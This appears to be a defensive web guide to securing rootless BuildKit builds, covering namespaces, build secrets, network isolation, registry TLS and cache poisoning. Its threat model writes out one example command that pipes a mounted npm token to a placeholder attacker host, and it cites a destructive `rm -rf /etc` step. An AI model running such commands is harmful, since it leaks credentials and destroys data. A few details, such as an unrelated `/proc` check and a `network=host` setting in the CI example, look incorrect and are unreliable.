---
title: "BuildKit Rootless Build Security"
description: "Secure BuildKit rootless container builds by hardening user namespace isolation, build secret handling, cache poisoning defences, and daemon privilege scoping."
slug: buildkit-rootless-security
date: 2026-05-01
lastmod: 2026-05-01
category: cicd
tags: ["buildkit", "rootless", "docker", "container-build", "user-namespaces", "supply-chain", "secrets"]
personas: ["platform-engineer", "sre", "security-engineer"]
article_number: 322
difficulty: advanced
estimated_reading_time: 16
published: true
layout: article.njk
permalink: "/articles/cicd/buildkit-rootless-security/index.html"
---

# BuildKit Rootless Build Security

## Problem

The traditional Docker build model has a fundamental privilege problem. The Docker daemon runs as root, and the Unix socket at `/var/run/docker.sock` is the boundary between user space and root access on the host. Any process that can write to that socket — a CI runner, a compromised build script, a malicious Dockerfile `RUN` instruction — effectively has root on the build host. This is not a theoretical concern: socket compromise via a malicious dependency executing code during `docker build` is a documented supply chain attack pattern. The build environment becomes as sensitive as production.

BuildKit's rootless mode shifts the daemon out of the root context entirely. The `buildkitd` process runs as an unprivileged user, using Linux user namespaces to remap UIDs and GIDs. Inside the build environment, a process that believes it is running as `uid=0` (root) is actually mapped to a non-root UID on the host — typically somewhere in the range `100000–165535` depending on `/etc/subuid` allocation. A malicious `RUN rm -rf /etc` inside the build context cannot touch the host filesystem because the kernel enforces the namespace boundary.

The uid/gid remapping mechanism works through the kernel's user namespace subsystem. When `rootlesskit` bootstraps `buildkitd`, it creates a new user namespace where the process's effective uid is 0 inside the namespace but maps to an unprivileged uid outside it. The `/proc/self/uid_map` file in the daemon's namespace reflects this: `0 100000 65536` means "inside-ns uid 0 maps to host uid 100000, and 65536 ids are mapped." Processes in build containers inherit subordinate namespaces within this space, providing a layered isolation model without requiring `CAP_SYS_ADMIN` on the host.

However, "rootless" does not mean "safe by default." The attack surface changes rather than disappears. User namespace escape vulnerabilities have a documented history in both the Linux kernel and container runtimes: runc CVE-2019-5736 allowed a container process to overwrite the host runc binary through `/proc/self/exe`; kernel CVE-2022-0492 allowed user namespace processes to escape cgroups. Running buildkitd rootless reduces the privilege level of a successful exploit, but the kernel attack surface is real and actively targeted.

Build secrets introduce a separate risk class. The `--mount=type=secret` Dockerfile syntax is designed to make secrets available at build time without persisting them in image layers. But misuse is easy: copying a secret to a permanent path, writing it to a file outside the mount, or using it in an instruction that gets captured in build metadata all result in secret leakage. Even correctly mounted secrets can leak if the build cache is configured to store intermediate layers, because the secret may appear in a cached `RUN` layer if cache keying is not scoped appropriately.

Network isolation during builds deserves separate attention. By default, BuildKit build containers inherit a network namespace that provides internet access, enabling base image pulls and package downloads. The `--network=host` flag in a rootless context is particularly dangerous: it bypasses network namespace isolation entirely, exposing the host network stack to the build container. A malicious `RUN` step can scan or exfiltrate data from the host network, reach internal services not accessible from the internet, or interfere with other services on the build host. Even without `--network=host`, unrestricted internet access during RUN instructions enables data exfiltration of secrets that are legitimately mounted.

Cache poisoning is a frequently underestimated vector. BuildKit's persistent cache allows build layers to be shared across builds and pipelines. A shared cache volume writable by multiple CI pipelines is an attractive target: a malicious build can inject a poisoned cache entry that a subsequent legitimate build consumes, embedding a backdoor into the output image. The registry-backed cache (type=registry) introduces a MITM risk if TLS certificate verification is disabled or if the registry itself is compromised. Cache poisoning is silent — the victim build succeeds with a green check, and the resulting image carries the malicious layer.

**Target systems:** BuildKit v0.13+, Docker Buildx v0.13+, containerd 1.7+, Linux kernel 5.15 or later with user namespaces enabled (`CONFIG_USER_NS=y`), `newuidmap`/`newgidmap` from `uidmap` package, and subordinate UID/GID ranges allocated in `/etc/subuid` and `/etc/subgid`.

## Threat Model

1. **CI job injecting malicious RUN step to exfiltrate build secrets.** An attacker with write access to a Dockerfile or a build argument injects a `RUN` instruction that reads from a mounted secret (e.g., `RUN cat /run/secrets/npm_token | curl -X POST attacker.example/collect -d @-`). Even with rootless mode, the secret is mounted and readable within the build container. Exfiltration succeeds over the network unless build-step network access is restricted.

2. **Registry MITM poisoning base image cache.** A network-level attacker interposes on the TLS connection between `buildkitd` and a container registry, serving a malicious base image. If BuildKit is configured without certificate pinning or with `insecure = true` in the registry block, the attacker's image is accepted, cached locally, and used for all subsequent builds until the cache is explicitly invalidated. The poisoned base propagates into every image produced from that cache.

3. **Developer with BuildKit socket access escaping user namespace.** A user with write access to the `buildkitd` socket (`$XDG_RUNTIME_DIR/buildkit/buildkitd.sock` or equivalent) can invoke arbitrary builds. In combination with a kernel user namespace escape vulnerability (e.g., an unpatched `runc` or kernel CVE), socket access becomes host code execution. The blast radius is limited to the host user running `buildkitd`, but that user typically has access to CI credentials and signing keys.

4. **Supply chain attacker poisoning shared BuildKit cache volume.** An attacker who can submit a CI job to a shared runner has write access to any cache mount not scoped with a unique ID. By crafting a build that populates a cache mount at a predictable path (e.g., `--mount=type=cache,id=npm`), they inject malicious packages into the cache. Subsequent builds that reuse this cache install the malicious packages without network fetches, bypassing registry security controls.

**Blast radius without hardening:** a successful exploit reaches the build host's unprivileged user account (rootless), the CI credential store, any secrets mounted into builds in progress, and potentially the shared cache volume. With kernel user namespace escape, blast radius expands to all processes running as the same uid on the host. Registry poisoning extends to every image built from the affected base across all pipelines consuming the shared cache.

## Configuration / Implementation

### Running buildkitd in rootless mode

Install the `uidmap` package to provide `newuidmap` and `newgidmap`, then allocate subordinate UID and GID ranges for the build user:

```bash
# Install prerequisites (Debian/Ubuntu)
sudo apt-get install -y uidmap

# Allocate subuid/subgid ranges for the ci-builder user
sudo usermod --add-subuids 100000-165535 --add-subgids 100000-165535 ci-builder

# Verify allocation
grep ci-builder /etc/subuid /etc/subgid
```

Install the BuildKit rootless helper script and start the daemon:

```bash
# As ci-builder user
export XDG_RUNTIME_DIR=/run/user/$(id -u)

# Install rootless buildkitd (from BuildKit release tarball)
curl -sSL https://github.com/moby/buildkit/releases/download/v0.13.2/buildkit-v0.13.2.linux-amd64.tar.gz \
  | tar -xz -C ~/.local

# Start buildkitd via rootlesskit
rootlesskit \
  --net=slirp4netns \
  --copy-up=/etc \
  --disable-host-loopback \
  buildkitd \
    --config ~/.config/buildkit/buildkitd.toml \
    --addr unix://${XDG_RUNTIME_DIR}/buildkit/buildkitd.sock \
  &
```

For persistent operation, use a systemd user unit:

```ini
# ~/.config/systemd/user/buildkitd.service
[Unit]
Description=BuildKit daemon (rootless)
After=network.target

[Service]
Environment=XDG_RUNTIME_DIR=/run/user/%U
ExecStart=%h/.local/bin/rootlesskit \
  --net=slirp4netns \
  --copy-up=/etc \
  --disable-host-loopback \
  %h/.local/bin/buildkitd \
    --config %h/.config/buildkit/buildkitd.toml \
    --addr unix://${XDG_RUNTIME_DIR}/buildkit/buildkitd.sock
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
```

```bash
systemctl --user enable --now buildkitd
systemctl --user status buildkitd

# Verify UID mapping — should show host UID in range 100000+
cat /proc/$(pgrep buildkitd)/status | grep -E "^(Uid|Gid):"
# Uid:  100000  100000  100000  100000
```

### Build secret handling

Use `--secret` with `buildctl` or Buildx instead of `ARG` or `ENV`. Secrets are mounted as tmpfs in the build container and are not captured in image layers.

```bash
# Pass a secret file to buildx
docker buildx build \
  --secret id=npm_token,src=${HOME}/.npmrc \
  --secret id=github_pat,src=/run/secrets/github-pat \
  --tag myrepo/myapp:latest \
  .
```

In the Dockerfile, consume the secret only within a `RUN --mount=type=secret` instruction:

```dockerfile
# syntax=docker/dockerfile:1.6

FROM node:20-alpine AS deps

# Secret is available only during this RUN; it is NOT written to the layer
RUN --mount=type=secret,id=npm_token,target=/root/.npmrc,uid=1000 \
    npm ci --ignore-scripts

FROM node:20-alpine AS runtime
COPY --from=deps /app/node_modules ./node_modules
COPY . .
USER 1000
CMD ["node", "server.js"]
```

Verify the secret did not land in any image layer:

```bash
# Check image history for secret content patterns
docker history --no-trunc myrepo/myapp:latest | grep -i token
# Should produce no output

# Inspect all layers with crane (from google/go-containerregistry)
crane export myrepo/myapp:latest - | tar -tv | grep -i npmrc
# Should produce no output
```

### Disabling network in build steps

Restrict network access per build stage using `--network`. Apply `none` to compilation stages that do not require network access:

```dockerfile
# syntax=docker/dockerfile:1.6

FROM golang:1.22-alpine AS build

# Dependency download needs network; compilation does not
RUN --mount=type=cache,id=gomod,target=/go/pkg/mod \
    go mod download

# No network needed for compilation — isolate it
RUN --network=none \
    --mount=type=cache,id=gomod,target=/go/pkg/mod \
    CGO_ENABLED=0 go build -trimpath -o /app/server ./cmd/server

FROM gcr.io/distroless/static-debian12
COPY --from=build /app/server /server
USER nonroot:nonroot
ENTRYPOINT ["/server"]
```

At the build invocation level, default to no network for release builds:

```bash
docker buildx build \
  --network=none \
  --build-arg BUILDKIT_INLINE_CACHE=0 \
  --tag myrepo/myapp:$(git rev-parse --short HEAD) \
  .
```

Audit existing Dockerfiles for `--network=host` usage and require documented justification in a PR comment before merging:

```bash
# Find Dockerfiles using --network=host
grep -r '\-\-network=host' . --include="Dockerfile*" --include="*.dockerfile"
```

### Registry TLS verification

Configure `buildkitd.toml` to enforce TLS and optionally pin CA certificates for specific registries:

```toml
# ~/.config/buildkit/buildkitd.toml

[worker.oci]
  enabled = true
  snapshotter = "overlayfs"

[worker.containerd]
  enabled = false

[registry."docker.io"]
  mirrors = ["mirror.internal.example.com"]

[registry."mirror.internal.example.com"]
  http = false
  insecure = false
  ca = ["/etc/ssl/certs/internal-ca.crt"]

[registry."registry.k8s.io"]
  http = false
  insecure = false

# Explicitly disable insecure registries — no exceptions
# Do NOT add entries with insecure = true
```

When using a local registry in CI (e.g., a kind cluster registry), prefer a TLS-enabled registry over disabling verification:

```bash
# Generate a self-signed cert for the local registry and trust it
openssl req -x509 -newkey rsa:4096 -keyout registry-key.pem \
  -out registry-cert.pem -days 365 -nodes \
  -subj "/CN=localhost" \
  -addext "subjectAltName=DNS:localhost,IP:127.0.0.1"

sudo cp registry-cert.pem /etc/ssl/certs/local-registry.crt
sudo update-ca-certificates
```

### Cache security

Scope cache mounts with unique IDs that include a component specific to the pipeline or repository to prevent cross-pipeline cache sharing:

```dockerfile
# syntax=docker/dockerfile:1.6

FROM python:3.12-slim AS build

# Scope cache by project slug — prevents other pipelines from reading or writing
RUN --mount=type=cache,id=pip-myapp-prod,uid=1000,gid=1000,target=/root/.cache/pip \
    pip install --no-compile -r requirements.txt
```

For the registry-backed cache, sign cache manifests with Cosign to detect tampering:

```bash
# Push build cache to a dedicated registry namespace
docker buildx build \
  --cache-to type=registry,ref=myrepo/cache:buildcache,mode=max \
  --cache-from type=registry,ref=myrepo/cache:buildcache \
  --tag myrepo/myapp:latest \
  .

# Sign the cache manifest after push
cosign sign --key cosign.key myrepo/cache:buildcache
```

For release builds, bypass cache entirely to guarantee a clean build:

```bash
docker buildx build \
  --no-cache \
  --pull \
  --tag myrepo/myapp:$(git rev-parse --short HEAD) \
  .
```

### GitHub Actions integration

Use the official `docker/build-push-action` with provenance and SBOM generation enabled. Disable cache on release-tagged builds:

```yaml
# .github/workflows/build.yml
name: Build and Push

on:
  push:
    branches: [main]
    tags: ["v*"]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write  # required for OIDC signing

    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
        with:
          driver-opts: |
            image=moby/buildkit:v0.13.2
            network=host

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push (branch)
        if: github.ref_type == 'branch'
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          provenance: true
          sbom: true
          cache-from: type=gha
          cache-to: type=gha,mode=max
          secrets: |
            npm_token=${{ secrets.NPM_TOKEN }}

      - name: Build and push (release tag — no cache)
        if: github.ref_type == 'tag'
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            ghcr.io/${{ github.repository }}:${{ github.ref_name }}
            ghcr.io/${{ github.repository }}:latest
          provenance: true
          sbom: true
          no-cache: true
          pull: true
          secrets: |
            npm_token=${{ secrets.NPM_TOKEN }}
```

### Seccomp and AppArmor for buildkitd

The default seccomp profile applied by the container runtime blocks many syscalls. For rootless `buildkitd`, apply an additional restrictive seccomp profile that allows only the syscalls required for image building:

```bash
# Apply the default Docker seccomp profile to the buildkitd process
# For systemd user units, set the profile via an environment variable
# that rootlesskit passes to buildkitd

# Verify which syscalls buildkitd uses in practice (requires strace)
strace -f -e trace=all -p $(pgrep buildkitd) 2>&1 | \
  awk -F'(' '{print $1}' | sort -u | head -40
```

For AppArmor, create a profile that allows `buildkitd`'s required operations while denying writes to sensitive host paths:

```text
# /etc/apparmor.d/buildkitd-rootless
#include <tunables/global>

profile buildkitd-rootless flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Allow overlay and fuse filesystem operations
  mount fstype=overlay,
  mount fstype=fuse,
  mount fstype=tmpfs,

  # Deny writes to host config and credential paths
  deny /etc/passwd w,
  deny /etc/shadow rw,
  deny /root/** rw,

  # Allow build workspace
  owner /tmp/buildkit-** rw,
  owner /run/user/[0-9]*/buildkit/** rw,

  # Network access for registry pulls
  network inet stream,
  network inet6 stream,
}
```

```bash
sudo apparmor_parser -r /etc/apparmor.d/buildkitd-rootless
aa-status | grep buildkitd
```

## Expected Behaviour

| Signal | Without hardening | With hardening |
|---|---|---|
| Secret in image layer | `docker history --no-trunc` reveals token value in RUN instruction metadata | `docker history` shows `RUN --mount=type=secret` with no secret content; `crane export` finds no secret file in any layer |
| Base image MITM | BuildKit accepts MITM'd image if registry TLS is misconfigured; poisoned base is cached and reused silently | `buildkitd.toml` enforces CA verification; MITM certificate fails validation; build errors with TLS handshake failure before pulling image |
| uid 0 inside build vs host | Build container process runs as real uid 0 (root) on host; malicious RUN can write to host paths accessible to root | `cat /proc/<pid>/status` in build container shows uid 0; on host, same pid maps to uid 100000+; writes outside container namespace are blocked by kernel |
| Shared cache poisoning | Malicious pipeline writes to `--mount=type=cache,id=npm`; subsequent builds read poisoned cache without network verification | Cache IDs scoped per-repo slug; release builds use `--no-cache --pull`; cache manifests signed with Cosign and verified before use |
| Network exfiltration from RUN | Build-time secret can be exfiltrated via curl/wget in any RUN step | Compilation stages use `--network=none`; network-enabled stages do not have access to mounted secrets simultaneously |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| User namespace kernel attack surface | Eliminates host-root privilege from build compromise; successful exploit lands as unprivileged uid on host | User namespaces expand the kernel attack surface; namespace escape CVEs (e.g., CVE-2022-0492) affect unprivileged users | Pin kernel version; subscribe to kernel CVE feeds; use gVisor or Kata Containers for high-risk builds; keep runc and containerd at latest patch releases |
| Filesystem snapshotter: overlayfs vs fuse-overlayfs | Native overlayfs gives near-native build performance with efficient layer management | Rootless mode may fall back to fuse-overlayfs when `/proc/sys/kernel/unprivileged_userns_clone` is restricted or overlayfs is unavailable in user namespaces; fuse-overlayfs is 20–40% slower on IO-heavy builds | Enable `CONFIG_OVERLAY_FS` with user namespace support; set `snapshotter = "overlayfs"` in `buildkitd.toml` and verify with `buildctl debug workers` |
| Cache locality vs poisoning risk | BuildKit cache dramatically reduces build times for large dependency trees (minutes to seconds on cache hit) | Shared cache across pipelines and teams creates a lateral contamination path; registry-backed cache introduces registry trust dependency | Scope cache IDs per repository; use `--no-cache` on release builds; sign and verify cache manifests with Cosign; use ephemeral cache volumes in short-lived runners |
| `--network=none` isolation | Prevents build-time secret exfiltration and lateral movement to internal services from RUN steps | Some build tools (Cargo, Go modules in proxy mode, pip) require network access for dependency resolution; blanket `--network=none` breaks these workflows | Split builds into network-enabled dependency fetch stage and network-isolated compile stage; pre-vendor dependencies and copy into build context |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| User namespaces disabled in kernel | `buildkitd` fails to start with `operation not permitted` or `clone3: permission denied`; rootlesskit exits immediately | `sysctl kernel.unprivileged_userns_clone` returns `0`; `cat /proc/sys/user/max_user_namespaces` returns `0` | `sysctl -w kernel.unprivileged_userns_clone=1` and `sysctl -w user.max_user_namespaces=10000`; persist in `/etc/sysctl.d/99-userns.conf`; on RHEL/CentOS verify SELinux policy allows user namespaces |
| buildkitd OOM on large image build | Build process killed mid-layer; `buildctl build` exits with `signal: killed`; `dmesg` shows OOM killer targeting buildkitd or snapshotter | `journalctl --user -u buildkitd` shows OOM events; `buildctl debug workers` shows worker restarting | Increase `ulimit -v` for the build user; set `memory.max` in the user cgroup (`systemd-run --user --scope -p MemoryMax=8G buildctl ...`); split large multi-stage builds into separate invocations |
| Secret mount permission denied | `RUN --mount=type=secret` fails with `permission denied` reading secret file | Build output contains `failed to mount secret: permission denied`; `id` inside build shows uid mismatch with secret file ownership | Set `uid=` and `gid=` on the `--mount=type=secret` to match the UID of the process reading the secret inside the build container; verify secret source file is readable by the buildkitd user on the host |
| fuse-overlayfs slowdown | Build times regress 20–40% compared to a previous environment; IO-intensive steps (large `npm install`, `apt-get`) are disproportionately slow | `buildctl debug workers` shows `snapshotter=fuse-overlayfs`; `dmesg` shows no overlayfs errors; `strace` on the worker shows heavy fuse syscall overhead | Verify kernel overlayfs user namespace support: `cat /proc/sys/fs/overcommit_memory`; rebuild kernel with `CONFIG_OVERLAY_FS=y`; on Ubuntu 22.04+, install `fuse-overlayfs` package as fallback but investigate root cause; as a temporary mitigation, set `insecure-entitlements = ["security.insecure"]` only if policy allows and use native overlayfs via a less restricted mount |

## Related Articles

- [Container Build Hardening](/articles/cicd/container-build-hardening/)
- [Artifact Integrity](/articles/cicd/artifact-integrity/)
- [Linux User Namespace Security](/articles/linux/linux-user-namespace-security/)
- [RuntimeClass: gVisor and Kata Containers](/articles/kubernetes/runtimeclass-gvisor-kata/)
- [CI/CD Secret Management](/articles/cicd/cicd-secret-management/)
